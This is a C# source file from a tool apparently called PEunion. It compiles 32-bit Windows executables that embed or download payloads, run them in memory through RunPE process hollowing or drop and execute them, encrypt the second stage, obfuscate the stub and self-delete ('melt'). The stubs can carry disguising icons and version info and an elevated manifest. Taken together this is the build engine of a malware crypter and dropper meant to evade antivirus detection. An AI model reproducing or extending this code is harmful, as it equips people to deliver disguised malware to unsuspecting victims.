using BytecodeApi;
using BytecodeApi.Extensions;
using BytecodeApi.IO;
using BytecodeApi.IO.FileSystem;
using PEunion.Compiler.Errors;
using PEunion.Compiler.Helper;
using PEunion.Compiler.Project;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;

namespace PEunion.Compiler.Compiler
{
	/// <summary>
	/// Implements compilation of native 32-bit executables using FASM as underlying compiler.
	/// </summary>
	public sealed class Pe32Compiler : ProjectCompiler
	{
		private readonly CompilerHelper Helper;

		internal Pe32Compiler(ProjectFile project, string intermediateDirectory, string outputFileName, ErrorCollection errors) : base(project, intermediateDirectory, outputFileName, errors)
		{
			Helper = new CompilerHelper(Project, Errors);
		}

		/// <summary>
		/// Compiles the project with the current settings.
		/// </summary>
		public override void Compile()
		{
			try
			{
				// Validate required files & directories
				Helper.ValidateFiles
				(
					ApplicationBase.Path,
					@"FASM\FASM.exe",
					@"FASM\INCLUDE\",
					@"Stub\pe32\"
				);
				if (Errors.HasErrors) return;

				// Copy source files to intermediate directory
				DirectoryEx.CopyTo(Path.Combine(ApplicationBase.Path, @"Stub\pe32"), IntermediateDirectorySource);

				// Validate required source files
				Helper.ValidateFiles
				(
					IntermediateDirectorySource,
					"Stub.asm",
					"Stage2.asm",
					@"Obfuscator\nop.txt",
					@"Obfuscator\nop_minimal.txt",
					@"Obfuscator\register.txt",
					@"Resources\default.manifest",
					@"Resources\elevated.manifest"
				);
				if (Errors.HasErrors) return;

				// Validate that RunPE uses valid 32-bit PE files
				Helper.ValidateRunPEBitness(32);
				if (Errors.HasErrors) return;

				// Preprocess files
				AssemblyPreprocessor.PreprocessDirectory(IntermediateDirectorySource, false);

				// Compile stage2
				CompileStage2();
				if (Errors.HasErrors) return;

				// Assemble stage2
				AssembleStage2();
				if (Errors.HasErrors) return;

				// Compile stub
				CompileStub();
				if (Errors.HasErrors) return;

				// Assemble stub
				AssembleStub();
			}
			catch (ErrorException ex)
			{
				Errors.Add(ErrorSource.Compiler, ErrorSeverity.Error, ex.Message, ex.Details);
			}
			catch (Exception ex)
			{
				Errors.Add(ErrorSource.Compiler, ErrorSeverity.Error, "Unhandled " + ex.GetType() + " while compiling project.", ex.GetFullStackTrace());
			}
		}

		private void CompileStage2()
		{
			try
			{
				// Compile files into EmbeddedSources.inc
				using (AssemblyStream assembly = new AssemblyStream(GetIntermediateSourcePath("EmbeddedSources.inc")))
				{
					foreach (EmbeddedSource source in Project.Sources.OfType<EmbeddedSource>())
					{
						string relativePath = @"Resources\EmbeddedSource-" + source.AssemblyId;
						string filePath = GetIntermediateSourcePath(relativePath);
						long size = new FileInfo(source.Path).Length;

						assembly.EmitComment(Path.GetFileName(source.Path));

						if (source.Compress)
						{
							byte[] compressed = NtCompression.Compress(File.ReadAllBytes(source.Path));
							if (compressed == null) throw new ErrorException("Failed to compress '" + Path.GetFileName(source.Path) + "'.");

							File.WriteAllBytes(filePath, compressed);

							int compressionRatio = 100 - (int)(compressed.Length * 100L / size);
							if (compressionRatio < 10)
							{
								Errors.Add(ErrorSource.Compiler, ErrorSeverity.Warning, "Compression ratio for '" + Path.GetFileName(source.Path) + "' is only " + compressionRatio + "%. It is recommended to disable compression.");
							}

							assembly.EmitConstant("EmbeddedSource" + source.AssemblyId + "Size", compressed.Length.ToString());
							assembly.EmitConstant("EmbeddedSource" + source.AssemblyId + "DecompressedSize", size.ToString());
							assembly.EmitFileData("EmbeddedSource" + source.AssemblyId, relativePath);
						}
						else
						{
							File.Copy(source.Path, filePath, true);

							assembly.EmitConstant("EmbeddedSource" + source.AssemblyId + "Size", size.ToString());
							assembly.EmitFileData("EmbeddedSource" + source.AssemblyId, relativePath);
						}

						assembly.WriteLine();
					}
				}

				// Compile strings into EmbeddedStrings.inc
				using (AssemblyStream assembly = new AssemblyStream(GetIntermediateSourcePath("EmbeddedStrings.inc")))
				{
					assembly.BinaryDataNameIndent = 20;

					// Compile download URL's
					foreach (DownloadSource source in Project.Sources.OfType<DownloadSource>())
					{
						assembly.EmitComment(source.Url);
						assembly.EmitStringData("DownloadUrl" + source.AssemblyId, source.Url);
					}

					// Compile drop filenames
					foreach (DropAction action in Project.Actions.OfType<DropAction>())
					{
						assembly.EmitComment(action.FileName);
						assembly.EmitStringData("DropFileName" + action.AssemblyId, action.FileName);
					}

					// Compile MessageBox strings
					foreach (MessageBoxAction action in Project.Actions.OfType<MessageBoxAction>())
					{
						assembly.EmitComment(action.Title);
						assembly.EmitStringData("MessageBoxTitle" + action.AssemblyId, action.Title);

						assembly.EmitComment(action.Text);
						assembly.EmitStringData("MessageBoxText" + action.AssemblyId, action.Text);
					}
				}

				// Compile main program
				string[] stage2Lines = File.ReadAllLines(GetIntermediateSourcePath("Stage2.asm"));
				using (AssemblyStream assembly = new AssemblyStream(GetIntermediateSourcePath("Stage2.asm")))
				{
					foreach (string line in stage2Lines)
					{
						if (line.Trim() == ";{MAIN}")
						{
							assembly.Indent = 4;

							// Compile actions
							foreach (ProjectAction action in Project.Actions)
							{
								if (action != Project.Actions.First())
								{
									assembly.EmitComment(new string('-', 74));
									assembly.WriteLine();
								}

								bool deletePayload = false;

								assembly.EmitLabel("action_" + action.AssemblyId);

								// Retrieve source
								if (action.Source is EmbeddedSource embeddedSource)
								{
									if (embeddedSource.Compress)
									{
										assembly.EmitComment("Decompress embedded file: " + Path.GetFileName(embeddedSource.Path));
										assembly.Emit("stdcall", "Decompress, EmbeddedSource" + action.Source.AssemblyId + ", EmbeddedSource" + action.Source.AssemblyId + "Size, EmbeddedSource" + action.Source.AssemblyId + "DecompressedSize");
										assembly.Emit("test", "eax, eax");
										assembly.Emit("jz", ".action_" + action.AssemblyId + "_end");
										assembly.Emit("mov", "[Payload], eax");
										assembly.Emit("mov", "[PayloadSize], EmbeddedSource" + action.Source.AssemblyId + "DecompressedSize");
										assembly.WriteLine();

										deletePayload = true;
									}
									else
									{
										assembly.EmitComment("Get embedded file: " + Path.GetFileName(embeddedSource.Path));
										assembly.Emit("mov", "[Payload], EmbeddedSource" + action.Source.AssemblyId);
										assembly.Emit("mov", "[PayloadSize], EmbeddedSource" + action.Source.AssemblyId + "Size");
										assembly.WriteLine();
									}
								}
								else if (action.Source is DownloadSource downloadSource)
								{
									assembly.EmitComment("Download: " + downloadSource.Url);
									assembly.Emit("lea", "eax, [PayloadSize]");
									assembly.Emit("stdcall", "Download, DownloadUrl" + action.Source.AssemblyId + ", eax");
									assembly.Emit("test", "eax, eax");
									assembly.Emit("jz", ".action_" + action.AssemblyId + "_end");
									assembly.Emit("mov", "[Payload], eax");
									assembly.WriteLine();

									deletePayload = true;
								}
								else if (action is MessageBoxAction)
								{
								}
								else
								{
									throw new InvalidOperationException();
								}

								// Perform action
								if (action is RunPEAction)
								{
									assembly.EmitComment("RunPE");
									assembly.Emit("stdcall", "RunPE, [Payload]");
									assembly.WriteLine();
								}
								else if (action is DropAction dropAction)
								{
									assembly.EmitComment("Drop " + dropAction.Location.GetDescription() + @"\" + dropAction.FileName + (dropAction.ExecuteVerb == ExecuteVerb.None ? null : " and execute (verb: " + dropAction.ExecuteVerb.GetDescription() + ")"));
									assembly.Emit("stdcall", "DropFile, " + (int)dropAction.Location + ", [Payload], [PayloadSize], DropFileName" + action.AssemblyId + ", " + dropAction.GetWin32FileAttributes() + ", " + (int)dropAction.ExecuteVerb);
									assembly.Emit("test", "eax, eax");
									assembly.Emit("jz", ".action_" + action.AssemblyId + "_end");
									assembly.WriteLine();
								}
								else if (action is MessageBoxAction messageBoxAction)
								{
									assembly.EmitComment("MessageBox (icon: " + messageBoxAction.Icon.GetDescription() + ", buttons: " + messageBoxAction.Buttons.GetDescription() + ")");
									assembly.Emit("pebcall", "PEB_User32Dll, PEB_MessageBoxW, NULL, MessageBoxText" + action.AssemblyId + ", MessageBoxTitle" + action.AssemblyId + ", 0x" + ((int)messageBoxAction.Icon | (int)messageBoxAction.Buttons).ToString("x8"));
									assembly.WriteLine();

									EmitMessageBoxEvent(messageBoxAction.OnOk, "ok", 1);
									EmitMessageBoxEvent(messageBoxAction.OnCancel, "cancel", 2);
									EmitMessageBoxEvent(messageBoxAction.OnYes, "yes", 6);
									EmitMessageBoxEvent(messageBoxAction.OnNo, "no", 7);
									EmitMessageBoxEvent(messageBoxAction.OnAbort, "abort", 3);
									EmitMessageBoxEvent(messageBoxAction.OnRetry, "retry", 4);
									EmitMessageBoxEvent(messageBoxAction.OnIgnore, "ignore", 5);

									void EmitMessageBoxEvent(ActionEvent actionEvent, string eventName, int returnValue)
									{
										if (actionEvent != ActionEvent.None)
										{
											assembly.EmitComment("If '" + eventName + "' was clicked, " + Helper.GetCommentForActionEvent(actionEvent));
											assembly.Emit("cmp", "eax, " + returnValue);
											assembly.Emit("jne", "@f");

											switch (actionEvent)
											{
												case ActionEvent.SkipNextAction:
													assembly.Emit("jmp", action == Project.Actions.Last() ? ".ret" : ".action_" + (action.AssemblyId + 1) + "_end");
													break;
												case ActionEvent.Exit:
													assembly.Emit("jmp", ".ret");
													break;
												default:
													throw new InvalidOperationException();
											}

											assembly.EmitLabel();
											assembly.WriteLine();
										}
									}
								}
								else
								{
									throw new InvalidOperationException();
								}

								// Delete payload, if additional memory was allocated.
								if (deletePayload)
								{
									assembly.EmitComment("Delete payload");
									assembly.Emit("pebcall", "PEB_Kernel32Dll, PEB_GetProcessHeap");
									assembly.Emit("pebcall", "PEB_Kernel32Dll, PEB_HeapFree, eax, 0, [Payload]");
								}

								assembly.EmitLabel("action_" + action.AssemblyId + "_end");
								assembly.WriteLine();
							}
						}
						else if (line.Trim() == ";{MELT}")
						{
							assembly.Indent = 4;

							if (Project.Startup.Melt)
							{
								assembly.EmitComment("Melt");
								assembly.Emit("stdcall", "Melt");
							}
						}
						else
						{
							assembly.Indent = 0;
							assembly.WriteLine(line);
						}
					}
				}
			}
			catch (ErrorException ex)
			{
				Errors.Add(ErrorSource.Compiler, ErrorSeverity.Error, ex.Message, ex.Details);
			}
			catch (Exception ex)
			{
				Errors.Add(ErrorSource.Compiler, ErrorSeverity.Error, "Unhandled " + ex.GetType() + " while compiling stage2.", ex.GetFullStackTrace());
			}
		}
		private void AssembleStage2()
		{
			try
			{
				string intermediateOutputFileName = GetIntermediateBinaryPath("stage2.exe");
				int exitCode = Helper.FasmCompile
				(
					GetIntermediateSourcePath("Stage2.asm"),
					intermediateOutputFileName,
					out string fasmOutput
				);

				if (exitCode == 0)
				{
					ExecutableHelper.ExtractShellcode(intermediateOutputFileName, GetIntermediateBinaryPath("stage2.shellcode"));
				}
				else
				{
					Errors.Add(ErrorSource.Assembly, ErrorSeverity.Error, "FASM.exe returned status code " + exitCode + ".", fasmOutput.Trim());
				}
			}
			catch (ErrorException ex)
			{
				Errors.Add(ErrorSource.Assembly, ErrorSeverity.Error, ex.Message, ex.Details);
			}
			catch (Exception ex)
			{
				Errors.Add(ErrorSource.Assembly, ErrorSeverity.Error, "Unhandled " + ex.GetType() + " while assembling stage2.", ex.GetFullStackTrace());
			}
		}
		private void CompileStub()
		{
			try
			{
				// Encrypt stage2 into Stage2Shellcode.inc
				using (AssemblyStream assembly = new AssemblyStream(GetIntermediateSourcePath("Stage2Shellcode.inc")))
				{
					Helper.EncryptData
					(
						GetIntermediateBinaryPath("stage2.shellcode"),
						GetIntermediateBinaryPath("stage2.shellcode_encrypted"),
						Project.Stub.Padding,
						out uint key,
						out uint paddingMask,
						out int paddingByteCount
					);

					assembly.EmitConstant("Stage2Size", new FileInfo(GetIntermediateBinaryPath("stage2.shellcode")).Length.ToString());
					assembly.EmitConstant("Stage2Key", "0x" + key.ToString("x8"));
					assembly.EmitConstant("Stage2PaddingMask", "0x" + paddingMask.ToString("x8"));
					assembly.EmitConstant("Stage2PaddingByteCount", paddingByteCount.ToString());
					assembly.EmitFileData("Stage2Shellcode", @"..\bin\stage2.shellcode_encrypted");
				}

				// Compile stub
				string[] stubLines = File.ReadAllLines(GetIntermediateSourcePath("Stub.asm"));
				using (AssemblyStream assembly = new AssemblyStream(GetIntermediateSourcePath("Stub.asm")))
				{
					foreach (string line in stubLines)
					{
						if (line.Trim() == ";{RSRC}")
						{
							assembly.Indent = 0;

							bool hasVersionInfo = !Project.VersionInfo.IsEmpty;
							bool hasManifest = Project.Manifest.Template != null || Project.Manifest.Path != null;
							bool hasIcon = Project.Stub.IconPath != null;

							List<string> directory = new List<string>();
							if (hasVersionInfo) directory.Add("RT_VERSION, VersionInfo");
							if (hasManifest) directory.Add("RT_MANIFEST, Manifest");
							if (hasIcon) directory.AddRange(new[] { "RT_ICON, Icons", "RT_GROUP_ICON, GroupIcon" });

							if (directory.Any())
							{
								assembly.WriteLine("section '.rsrc' resource data readable");
								assembly.Indent = 4;

								assembly.EmitDefinition("directory", directory);

								if (hasVersionInfo)
								{
									assembly.EmitDefinition("resource VersionInfo,", "1, LANG_NEUTRAL, VersionInfoData");
								}
								if (hasManifest)
								{
									assembly.EmitDefinition("resource Manifest,", "1, LANG_NEUTRAL, ManifestData");
								}
								if (hasIcon)
								{
									Icon[] icon = IconExtractor.FromFile(Project.Stub.IconPath)?.Split();
									if (icon == null) throw new ErrorException("Could not read icon from file '" + Path.GetFileName(Project.Stub.IconPath) + "'.");

									for (int i = 0; i < icon.Length; i++)
									{
										icon[i].Save(GetIntermediateSourcePath(@"Resources\icon-" + (i + 1) + ".ico"));
									}

									assembly.EmitDefinition("resource Icons,", Enumerable.Range(1, icon.Length).Select(i => i + ", LANG_NEUTRAL, IconData" + i));
									assembly.EmitDefinition("resource GroupIcon,", "1, LANG_NEUTRAL, GroupIconData");
									assembly.EmitDefinition("icon GroupIconData,", Enumerable.Range(1, icon.Length).Select(i => "IconData" + i + @", 'Resources\icon-" + i + ".ico'"));
								}

								if (hasVersionInfo)
								{
									assembly.EmitDefinition
									(
										"versioninfo VersionInfoData,",
										"VOS__WINDOWS32, VFT_APP, VFT2_UNKNOWN, LANG_ENGLISH+SUBLANG_DEFAULT, 0",
										"'FileDescription', '" + Helper.FasmEscapeDefinitionString(Project.VersionInfo.FileDescription) + "'",
										"'ProductName', '" + Helper.FasmEscapeDefinitionString(Project.VersionInfo.ProductName) + "'",
										"'FileVersion', '" + Helper.FasmEscapeDefinitionString(Project.VersionInfo.FileVersion) + "'",
										"'ProductVersion', '" + Helper.FasmEscapeDefinitionString(Project.VersionInfo.ProductVersion) + "'",
										"'LegalCopyright', '" + Helper.FasmEscapeDefinitionString(Project.VersionInfo.Copyright) + "'",
										"'OriginalFilename', '" + Helper.FasmEscapeDefinitionString(Project.VersionInfo.OriginalFilename) + "'"
									);
								}
								if (hasManifest)
								{
									string manifestFileName;

									if (Project.Manifest.Template != null)
									{
										manifestFileName = Project.Manifest.Template.GetDescription();
									}
									else if (Project.Manifest.Path != null)
									{
										manifestFileName = Path.GetFileNameWithoutExtension(Project.Manifest.Path);
										File.Copy(Project.Manifest.Path, GetIntermediateSourcePath(@"Resources\" + manifestFileName + ".manifest"));
									}
									else
									{
										throw new InvalidOperationException();
									}

									assembly.WriteLine("\tresdata ManifestData");
									assembly.WriteLine("\t\tfile 'Resources\\" + manifestFileName + ".manifest'");
									assembly.WriteLine("\tendres");
								}
							}
						}
						else
						{
							assembly.Indent = 0;
							assembly.WriteLine(line);
						}
					}
				}

				// Obfuscate code
				AssemblyObfuscator obfuscator = new AssemblyObfuscator(Path.Combine(IntermediateDirectorySource, "Obfuscator"));
				obfuscator.ObfuscateFile(GetIntermediateSourcePath("Stub.asm"));
				obfuscator.ObfuscateFile(GetIntermediateSourcePath("Emulator.asm"));
			}
			catch (ErrorException ex)
			{
				Errors.Add(ErrorSource.Compiler, ErrorSeverity.Error, ex.Message, ex.Details);
			}
			catch (Exception ex)
			{
				Errors.Add(ErrorSource.Compiler, ErrorSeverity.Error, "Unhandled " + ex.GetType() + " while compiling stub.", ex.GetFullStackTrace());
			}
		}
		private void AssembleStub()
		{
			try
			{
				string intermediateOutputFileName = GetIntermediateBinaryPath(Path.GetFileName(OutputFileName));
				int exitCode = Helper.FasmCompile
				(
					GetIntermediateSourcePath("Stub.asm"),
					intermediateOutputFileName,
					out string fasmOutput
				);

				if (exitCode == 0)
				{
					Helper.AppendEofData(intermediateOutputFileName);
					File.Copy(intermediateOutputFileName, OutputFileName, true);
				}
				else
				{
					Errors.Add(ErrorSource.Assembly, ErrorSeverity.Error, "FASM.exe returned status code " + exitCode + ".", fasmOutput.Trim());
				}
			}
			catch (ErrorException ex)
			{
				Errors.Add(ErrorSource.Assembly, ErrorSeverity.Error, ex.Message, ex.Details);
			}
			catch (Exception ex)
			{
				Errors.Add(ErrorSource.Assembly, ErrorSeverity.Error, "Unhandled " + ex.GetType() + " while assembling stage2.", ex.GetFullStackTrace());
			}
		}
	}
}